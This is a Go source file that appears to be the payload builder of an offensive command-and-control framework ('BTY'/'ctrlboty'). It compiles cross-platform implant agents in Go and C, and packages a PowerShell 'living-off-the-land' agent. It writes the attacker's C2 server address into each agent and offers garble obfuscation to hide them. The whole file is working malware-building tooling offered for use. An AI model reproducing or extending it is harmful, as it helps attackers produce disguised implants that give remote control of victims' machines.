package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

// Builder generates payloads for all target platforms.
// Usage: builder [target] [options]

var targets = map[string]PayloadConfig{
	"go-linux": {
		Name: "ctrlboty-agent-linux", Source: "cmd/agent/main.go",
		GOOS: "linux", GOARCH: "amd64", CGO: false, Obfuscate: false,
	},
	"go-linux-arm": {
		Name: "ctrlboty-agent-linux-arm64", Source: "cmd/agent/main.go",
		GOOS: "linux", GOARCH: "arm64", CGO: false, Obfuscate: false,
	},
	"go-windows": {
		Name: "ctrlboty-agent.exe", Source: "cmd/agent/main.go",
		GOOS: "windows", GOARCH: "amd64", CGO: false, Obfuscate: false,
	},
	"go-darwin": {
		Name: "ctrlboty-agent-darwin", Source: "cmd/agent/main.go",
		GOOS: "darwin", GOARCH: "amd64", CGO: false, Obfuscate: false,
	},
	"go-darwin-arm": {
		Name: "ctrlboty-agent-darwin-arm64", Source: "cmd/agent/main.go",
		GOOS: "darwin", GOARCH: "arm64", CGO: false, Obfuscate: false,
	},
	"go-all-obfuscated": {
		Name: "ctrlboty-agent", Source: "cmd/agent/main.go",
		GOOS: "ALL", GOARCH: "ALL", CGO: false, Obfuscate: true,
	},
	"c-linux": {
		Name: "agent-c-linux", Source: "agents/c/agent.c",
		GOOS: "linux", CGO: false, Compiler: "gcc",
	},
	"c-windows": {
		Name: "agent-c.exe", Source: "agents/c/agent.c",
		GOOS: "windows", CGO: false, Compiler: "x86_64-w64-mingw32-gcc",
	},
	"ps1": {
		Name: "agent.ps1", Source: "agents/powershell/agent.ps1",
		GOOS: "windows", NoCompile: true,
	},
}

type PayloadConfig struct {
	Name       string
	Source     string
	GOOS       string
	GOARCH     string
	CGO        bool
	Obfuscate  bool
	Compiler   string
	NoCompile  bool
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("BTY - Payload Builder")
		fmt.Println()
		fmt.Println("Usage:  builder <target> [--server <host:port>] [--output <path>]")
		fmt.Println()
		fmt.Println("Targets:")
		fmt.Println("  go-linux          Go agent, Linux x86_64 (7 MB)")
		fmt.Println("  go-linux-arm      Go agent, Linux ARM64 (7 MB)")
		fmt.Println("  go-windows        Go agent, Windows x86_64 (8 MB)")
		fmt.Println("  go-darwin         Go agent, macOS x86_64 (7 MB)")
		fmt.Println("  go-darwin-arm     Go agent, macOS ARM64 (7 MB)")
		fmt.Println("  go-all-obfuscated All Go platforms obfuscated (garble)")
		fmt.Println("  c-linux           C agent, Linux (20 KB)")
		fmt.Println("  c-windows         C agent, Windows (25 KB)")
		fmt.Println("  ps1               PowerShell agent (living-off-the-land)")
		fmt.Println("  all               Build all targets")
		fmt.Println()
		fmt.Println("Options:")
		fmt.Println("  --server <host:port>  C2 server address")
		fmt.Println("  --output <path>       Output directory (default: ./payloads/)")
		os.Exit(1)
	}

	target := os.Args[1]
	outputDir := "payloads"
	serverFlag := ""
	for i := 2; i < len(os.Args); i++ {
		switch os.Args[i] {
		case "--output":
			if i+1 < len(os.Args) {
				outputDir = os.Args[i+1]
				i++
			}
		case "--server":
			if i+1 < len(os.Args) {
				serverFlag = os.Args[i+1]
				i++
			}
		}
	}

	os.MkdirAll(outputDir, 0755)

	if target == "all" {
		for t := range targets {
			if t == "go-all-obfuscated" {
				continue
			}
			buildPayload(t, outputDir, serverFlag)
		}
		return
	}

	cfg, ok := targets[target]
	if !ok {
		fmt.Printf("Unknown target: %s\n", target)
		os.Exit(1)
	}

	buildPayloadWithConfig(cfg, outputDir, serverFlag)
}

func buildPayload(target string, outputDir, server string) {
	cfg := targets[target]
	buildPayloadWithConfig(cfg, outputDir, server)
}

func buildPayloadWithConfig(cfg PayloadConfig, outputDir, server string) {
	fmt.Printf("[BUILD] %s → %s/%s\n", cfg.Source, outputDir, cfg.Name)

	if cfg.NoCompile {
		// Copy source file as-is
		src, _ := filepath.Abs(cfg.Source)
		data, err := os.ReadFile(src)
		if err != nil {
			fmt.Printf("  ERROR: %v\n", err)
			return
		}
		dest := filepath.Join(outputDir, cfg.Name)
		if server != "" {
			data = replaceServer(data, server)
		}
		os.WriteFile(dest, data, 0644)
		fmt.Printf("  OK: %s (%d bytes)\n", dest, len(data))
		return
	}

	if cfg.Compiler != "" {
		// C compilation
		buildOutput := filepath.Join(outputDir, cfg.Name)
		checkCompiler(cfg.Compiler)
		cmd := exec.Command(cfg.Compiler, "-O2", "-s", "-o", buildOutput, cfg.Source)
		if cfg.GOOS == "windows" && cfg.Compiler != "gcc" {
			cmd.Args = append(cmd.Args, "-lws2_32")
		}
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		if err := cmd.Run(); err != nil {
			fmt.Printf("  ERROR: %v\n", err)
			return
		}
		fmt.Printf("  OK: %s\n", buildOutput)
		return
	}

	// Go compilation
	buildOutput := filepath.Join(outputDir, cfg.Name)
	if cfg.GOOS == "windows" {
		buildOutput += ".exe"
	}

	env := os.Environ()
	env = append(env, "GOOS="+cfg.GOOS)
	env = append(env, "GOARCH="+cfg.GOARCH)
	if !cfg.CGO {
		env = append(env, "CGO_ENABLED=0")
	}

	// Embed server address via ldflags if provided
	if server != "" {
		ldflags := fmt.Sprintf("-s -w -X main.defaultServer=%s", server)
		env = append(env, "GOFLAGS=-ldflags="+ldflags)
	}

	goBin := findGoBinary()

	if cfg.Obfuscate && cfg.GOOS != "ALL" {
		// Use garble for obfuscation
		cmd := exec.Command("garble", "build", "-o", buildOutput, cfg.Source)
		cmd.Env = env
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		cmd.Run()
	} else {
		args := []string{"build", "-ldflags=-s -w", "-o", buildOutput}
		if server != "" {
			args = []string{"build", fmt.Sprintf("-ldflags=-s -w -X main.defaultServer=%s", server), "-o", buildOutput}
		}
		args = append(args, cfg.Source)
		cmd := exec.Command(goBin, args...)
		cmd.Env = env
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		if err := cmd.Run(); err != nil {
			fmt.Printf("  ERROR: %v\n", err)
			return
		}
		fmt.Printf("  OK: %s\n", buildOutput)
	}
}

func findGoBinary() string {
	paths := []string{
		"/tmp/go/bin/go",
		"/usr/local/go/bin/go",
		"go",
	}
	for _, p := range paths {
		if _, err := os.Stat(p); err == nil {
			return p
		}
	}
	return "go"
}

func checkCompiler(cc string) {
	if _, err := exec.LookPath(cc); err != nil {
		fmt.Printf("  WARNING: compiler '%s' not found. Skipping.\n", cc)
		fmt.Printf("  Install with: sudo apt-get install gcc mingw-w64\n")
	}
}

func replaceServer(data []byte, server string) []byte {
	// Simple string replacement for server address
	old := "127.0.0.1:8443"
	return []byte(strings.ReplaceAll(string(data), old, server))
}

func init() {
	// Ensure we can find Go binary
	if runtime.GOOS == "linux" {
		os.Setenv("GOMODCACHE", "/tmp/gopath/pkg/mod")
	}
}
